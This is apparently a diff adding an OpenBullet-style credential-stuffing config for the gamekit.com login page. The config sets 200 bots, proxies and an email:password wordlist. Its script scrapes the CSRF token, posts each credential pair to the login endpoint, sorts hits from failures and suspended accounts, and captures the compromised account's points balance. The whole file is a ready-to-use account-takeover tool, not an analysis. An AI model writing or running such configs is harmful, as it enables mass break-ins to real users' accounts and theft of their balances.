@@ -1,0 +1,59 @@
+[SETTINGS]
+{
+  "Name": "Gamekit",
+  "SuggestedBots": 200,
+  "LastModified": "2019-05-10T09:49:26.5204964+02:00",
+  "AdditionalInfo": "",
+  "Author": "xX-365094-Xx",
+  "Version": "1.2.8 Anomaly",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://gamekit.com/login/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "<input type=\"hidden\" id=\"_token\" name=\"_token\" value=\"" "\" />" -> VAR "KEY" 
+
+#POST REQUEST POST "https://gamekit.com/user/login/" 
+  CONTENT "email=<USER>&password=<PASS>&remember_me=1&_target_path=https%3A%2F%2Fgamekit.com%2F&_token=<KEY>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "origin: https://gamekit.com" 
+  HEADER "referer: https://gamekit.com/login/" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "{\"success\":true,\"" 
+  KEYCHAIN Failure OR 
+    KEY "{\"success\":false,\"" 
+    KEY "<h1>Account Suspended</h1>" 
+
+REQUEST GET "https://gamekit.com/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#POINT PARSE "<SOURCE>" LR "GAMEKIT.DataLayer.user.pkt = " ";" -> CAP "Nombre de point" 
+
